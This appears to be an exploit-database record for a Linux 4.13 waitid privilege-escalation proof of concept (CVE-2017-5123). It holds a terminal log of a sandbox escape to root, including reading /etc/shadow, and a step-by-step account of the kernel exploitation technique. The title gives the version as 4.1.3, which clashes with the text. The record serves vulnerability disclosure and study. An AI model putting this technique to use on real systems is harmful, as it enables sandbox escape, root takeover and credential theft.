{
    "text": "title : Linux Kernel 4.1.3 ( Ubuntu 17.10 ) waitid (  ) SMEP/SMAP Privilege Escalation  ， detail : This is a proof of concept exploit for the waitid bug introduced in version 4.13 of the Linux kernel. It can be used to break out of sandboxes such as that in Google Chrome.  ， cve : advisories | CVE-2017-5123  ，  ， desc : / Proof of concept exploit for waitid bug introduced in Linux Kernel 4.13  ， / By Chris Salls ( twitter.com/chris_salls )   ， / This exploit can be used to break out out of sandboxes such as that in google chrome  ， / In this proof of concept we install the seccomp filter from chrome as well as a chroot ,   ， / then break out of those and get root  ， / Bypasses smep and smap , but is somewhat unreliable and may crash the kernel instead  ， / offsets written and tested on ubuntu 17.10-beta2  ，  ， salls @ ubuntu :  ~ /x $ uname -a  ， Linux ubuntu 4.13.0-12-generic # 13-Ubuntu SMP Sat Sep 23 03 : 40 : 16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux  ， salls @ ubuntu :  ~ /x $ gcc poc_smap_bypass.c -lpthread -o poc  ， salls @ ubuntu :  ~ /x $ ./poc  ， Installed sandboxes. Seccomp , chroot , uid namespace  ，  ， check in /sys/kernel/slab/task_struct/object_size to make sure this is right  ， If it's wrong the exploit will fail  ， found kernel base 0xffffffff87600000  ， found mapping at 0xffff8eb500000000  ， found mapping end at 0xffff8eb5a0000000  ， 9999 threads created  ， found second mapping at 0xffff8eb600000000  ， found second mapping end at 0xffff8eb750000000  ， last_mapping is 0x150000000 bytes  ， min guess ffff8eb650000000  ， starting guessing  ， this part can take up to a minute , or crash the machine :  )   ， found my task at 0xffff8eb67555dd00  ， joining threads  ， part 2 start  ， mapped 0x100000000  ， trying to find physmap mapping  ， found mapping at 0xffff8eb500000000  ， f213000 changed to 0  ， page locked !   ， detected change at 0xffff8eb658000000  ， physmap addr is good  ， here we go  ， trying to call system.  ，  # id  ， uid=0 ( root ) gid=0 ( root ) groups=0 ( root )  , 4 ( adm )  , 24 ( cdrom )  , 27 ( sudo )  , 30 ( dip )  , 46 ( plugdev )  , 118 ( lpadmin )  , 128 ( sambashare )  , 1000 ( salls )   ，  # head /etc/shadow  ， root :  !  : 17447 : 0 : 99999 : 7 :   ， daemon :  *  : 17435 : 0 : 99999 : 7 :   ，   ，  ， / * overview of exploit *   ， waitid uses unsafe_put_user without checking access_ok ,   ， allowing the user to give a kernel address for infop and write over kernel memory.  ， when given invalid parameters this just writes the following 32 bit integers  ， 0 , 0 , 0 , _ , 0 , 0 , 0  ，  ( the 4th element is unchanged )   ， inside the chrome sandbox we cannot fork ( can only make threads )   ， so we can only give invalid parameters to waitid and only write 0's to kernel memory ,   ，   ， To exploit this in the presence of smap :   ，   ， I start out by iteratively calling waitid until we find the kernel's base address  ， When it's found it will not return efault error from the syscall  ，   ， Now , I can only write 0's at this point , so I spray 10000 threads and attempt  ， to write 0's over the beginning of the task struct to unset the seccomp flag  ， This part is kind of unreliable and depends on the size of the task struct which  ， changes based on cpu.  ，   ， If it succceeds , I now know where the task struct is and no longer have seccomp  ， By shifting the location of the write and using the pid of the child process , I  ， can now write 5 consecutive arbitrary non-zero bytes. So I can create an address  ， with this bitmask 0xffffffffff000000  ，   ， Now to create data at such an address I use the physmap , a mirror of all userland  ， pages that exists in kernel memory. Mmap a large amount of memory , try writing at  ， various places in the physmap until we see userland memory change. Then mlock that  ， page.  ，   ， With controlled data in the kernel , I use the 5 byte write described above to change  ， our task->files to point at the controlled page. This give me control of the file  ， operations and arbitrary read/write.  ，   ， From here , I remove the chroot and edit my creds to make that thread root.",
    "time": "Nov 7, 2017"
}